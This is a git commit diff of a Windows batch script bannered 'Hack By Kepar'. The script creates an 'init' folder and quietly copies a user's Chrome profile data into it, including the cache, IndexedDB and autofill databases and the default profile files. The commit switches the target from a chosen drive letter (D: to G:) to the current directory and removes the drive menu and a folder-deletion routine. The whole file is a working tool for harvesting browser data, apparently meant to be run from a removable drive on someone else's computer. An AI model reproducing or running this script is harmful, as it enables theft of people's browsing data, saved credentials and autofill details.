b28c31e2e45bb42ceff9e0d8551a5247a04d8c51
KeparYTbcc <67996155+KeparYTbcc@users.noreply.github.com>
2020-10-10 18:04:33 +0100

    Update Project.bat

--- Project.bat
+++ Project.bat
@@ -1,37 +1,10 @@
 @echo off
 color b
 cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          Hack By
-echo                           Kepar
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                      Choose a device
-echo.
-echo                          D:\ (1)
-echo.
-echo                          E:\ (2)
-echo.
-echo                          F:\ (3)
-echo.
-echo                          G:\ (4)
-echo.
-echo                    Delete The Folder (5)}
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-set /p web=:
-if "%web%"=="1" goto d
-if "%web%"=="2" goto e
-if "%web%"=="3" goto f
-if "%web%"=="4" goto g
-if "%web%"=="5" goto dell
 
-:d
-cd D:\
+
 mkdir init
-cd D:\init
+cd %CD%\init
 mkdir IndexedDB
 mkdir AutoFillDatabase
 mkdir Cache
@@ -47,7 +20,7 @@ echo.
 echo                             0%%%
 echo.
 echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default"  D:\init /Q >nul
+Xcopy "%localappdata%\Google\Chrome\User Data\Default"  %CD%\init /Q >nul
 cls
 echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 echo.
@@ -59,7 +32,7 @@ echo.
 echo                            20%%%
 echo.
 echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default\Cache"  D:\init\Cache /E /H /C /I /Q >nul
+Xcopy "%localappdata%\Google\Chrome\User Data\Default\Cache"  %CD%\init\Cache /E /H /C /I /Q >nul
 cls
 echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 echo.
@@ -71,7 +44,7 @@ echo.
 echo                            40%%%
 echo.
 echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default\IndexedDB"  D:\init\IndexedDB /E /H /C /I /Q >nul
+Xcopy "%localappdata%\Google\Chrome\User Data\Default\IndexedDB"  %CD%\init\IndexedDB /E /H /C /I /Q >nul
 cls
 echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 echo.
@@ -83,7 +56,7 @@ echo.
 echo                            60%%%
 echo.
 echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default\AutoFillDatabase"  D:\init\AutoFillDatabase /E /H /C /I /Q >nul
+Xcopy "%localappdata%\Google\Chrome\User Data\Default\AutoFillDatabase"  %CD%\init\AutoFillDatabase /E /H /C /I /Q >nul
 cls
 echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 echo.
@@ -95,7 +68,7 @@ echo.
 echo                            80%%%
 echo.
 echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default\AutofillStrikeDatabase"  D:\init\AutofillStrikeDatabase /E /H /C /I /Q >nul
+Xcopy "%localappdata%\Google\Chrome\User Data\Default\AutofillStrikeDatabase"  %CD%\init\AutofillStrikeDatabase /E /H /C /I /Q >nul
 cls
 echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 echo.
@@ -115,347 +88,6 @@ echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 pause >nul 
 exit
 
-:e
-cd E:\
-mkdir init
-cd E:\init
-mkdir IndexedDB
-mkdir AutoFillDatabase
-mkdir Cache
-mkdir AutofillStrikeDatabase
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          Hack By
-echo                           Kepar
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                             0%%%
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default"  E:\init /Q >nul
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          Hack By
-echo                           Kepar
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                            20%%%
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default\Cache"  E:\init\Cache /E /H /C /I /Q >nul
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          Hack By
-echo                           Kepar
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                            40%%%
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default\IndexedDB"  E:\init\IndexedDB /E /H /C /I /Q >nul
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          Hack By
-echo                           Kepar
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                            60%%%
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default\AutoFillDatabase"  E:\init\AutoFillDatabase /E /H /C /I /Q >nul
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          Hack By
-echo                           Kepar
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                            80%%%
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default\AutofillStrikeDatabase"  E:\init\AutofillStrikeDatabase /E /H /C /I /Q >nul
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          Hack By
-echo                           Kepar
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          All Files
-echo                           Copied
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                   Strike a key to leave
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-pause >nul 
-exit
-
-:f
-cd F:\
-mkdir init
-cd F:\init
-mkdir IndexedDB
-mkdir AutoFillDatabase
-mkdir Cache
-mkdir AutofillStrikeDatabase
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          Hack By
-echo                           Kepar
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                             0%%%
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default"  F:\init /Q >nul
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          Hack By
-echo                           Kepar
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                            20%%%
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default\Cache"  F:\init\Cache /E /H /C /I /Q >nul
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          Hack By
-echo                           Kepar
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                            40%%%
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default\IndexedDB" F:\init\IndexedDB /E /H /C /I /Q >nul
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          Hack By
-echo                           Kepar
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                            60%%%
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default\AutoFillDatabase"  F:\init\AutoFillDatabase /E /H /C /I /Q >nul
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          Hack By
-echo                           Kepar
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                            80%%%
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default\AutofillStrikeDatabase"  F:\init\AutofillStrikeDatabase /E /H /C /I /Q >nul
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          Hack By
-echo                           Kepar
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          All Files
-echo                           Copied
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                   Strike a key to leave
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-pause >nul 
-exit
-
-:g
-cd G:\
-mkdir init
-cd G:\init
-mkdir IndexedDB
-mkdir AutoFillDatabase
-mkdir Cache
-mkdir AutofillStrikeDatabase
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          Hack By
-echo                           Kepar
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                             0%%%
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default"  G:\init /Q >nul
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          Hack By
-echo                           Kepar
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                            20%%%
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default\Cache"  G:\init\Cache /E /H /C /I /Q >nul
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          Hack By
-echo                           Kepar
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                            40%%%
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default\IndexedDB"  G:\init\IndexedDB /E /H /C /I /Q >nul
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          Hack By
-echo                           Kepar
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                            60%%%
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default\AutoFillDatabase"  G:\init\AutoFillDatabase /E /H /C /I /Q >nul
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          Hack By
-echo                           Kepar
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                            80%%%
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Xcopy "%localappdata%\Google\Chrome\User Data\Default\AutofillStrikeDatabase"  G:\init\AutofillStrikeDatabase /E /H /C /I /Q >nul
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          Hack By
-echo                           Kepar
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                          All Files
-echo                           Copied
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                   Strike a key to leave
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-pause >nul 
-exit
-
-:dell
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                     Delete init folde
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo                      Choose a device
-echo.
-echo                          D:\ (1)
-echo.
-echo                          E:\ (2)
-echo.
-echo                          F:\ (3)
-echo.
-echo                          G:\ (4)
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-set /p web=:
-if "%web%"=="1" goto dd
-if "%web%"=="2" goto ee
-if "%web%"=="3" goto ff
-if "%web%"=="4" goto gg
-
-:dd
-cd D:\
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo           Are you sure u want to delete this
-echo                      folder...
-echo            this action cant be reversed
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-rmdir /s D:\init
-pause
-exit
-
-:ee
-cd E:\
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo           Are you sure u want to delete this
-echo                      folder...
-echo            this action cant be reversed
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-rmdir /s E:\init
-pause
-exit
-
-:ff
-cd F:\
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo           Are you sure u want to delete this
-echo                      folder...
-echo            this action cant be reversed
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-rmdir /s F:\init
-pause
-exit
-
-:gg
-cd G:\
-cls
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-echo.
-echo           Are you sure u want to delete this
-echo                      folder...
-echo            this action cant be reversed
-echo.
-echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-rmdir /s G:\init
-pause
-exit
 
 
 
